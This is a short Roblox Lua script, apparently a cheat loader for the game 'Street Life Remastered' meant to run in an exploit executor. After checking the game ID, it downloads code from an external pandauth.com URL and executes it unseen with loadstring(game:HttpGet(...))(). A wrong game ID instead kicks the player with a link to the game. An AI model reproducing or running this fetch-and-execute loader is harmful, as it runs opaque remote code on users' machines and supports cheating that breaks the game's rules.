if game.PlaceId ~= 71600459831333 then
    local lp = game:GetService("Players").LocalPlayer
    local link = "https://www.roblox.com/games/71600459831333/Street-Life-Remastered"
    if setclipboard then pcall(function() setclipboard(link) end) end
    lp:Kick("[SSLR] Wrong game.\n\nJoin:\n" .. link)
    return
end

loadstring(game:HttpGet("https://vss.pandauth.com/kv/5dbc99f746c76dc1"))()
